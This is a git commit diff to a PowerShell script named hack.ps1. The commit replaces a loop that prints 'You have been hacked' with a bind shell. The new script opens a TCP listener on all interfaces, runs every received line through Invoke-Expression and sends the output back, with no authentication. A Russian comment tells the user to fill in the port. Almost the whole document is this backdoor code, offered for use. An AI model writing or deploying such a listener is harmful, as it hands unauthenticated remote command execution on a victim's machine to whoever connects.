bb5dc7565b8750568aff406c5e6799727be58a40
BlesK <109669748+Z0DEN@users.noreply.github.com>
2023-12-25 12:25:49 +0700

    Update hack.ps1

--- hack.ps1
+++ hack.ps1
@@ -1,4 +1,13 @@
-while($true) {
-   Write-Host "You have been hacked"
-   Start-Sleep -Seconds 1
+$listener = New-Object System.Net.Sockets.TcpListener([IPAddress]::Any, your-port) # замените 'your-port' на ваш порт
+$listener.Start()
+
+while ($true) {
+   $client = $listener.AcceptTcpClient()
+   $stream = $client.GetStream()
+   $reader = New-Object System.IO.StreamReader($stream)
+   $command = $reader.ReadLine()
+   $result = Invoke-Expression $command 2>&1 | Out-String
+   $writer = New-Object System.IO.StreamWriter($stream)
+   $writer.WriteLine($result)
+   $writer.Flush()
 }
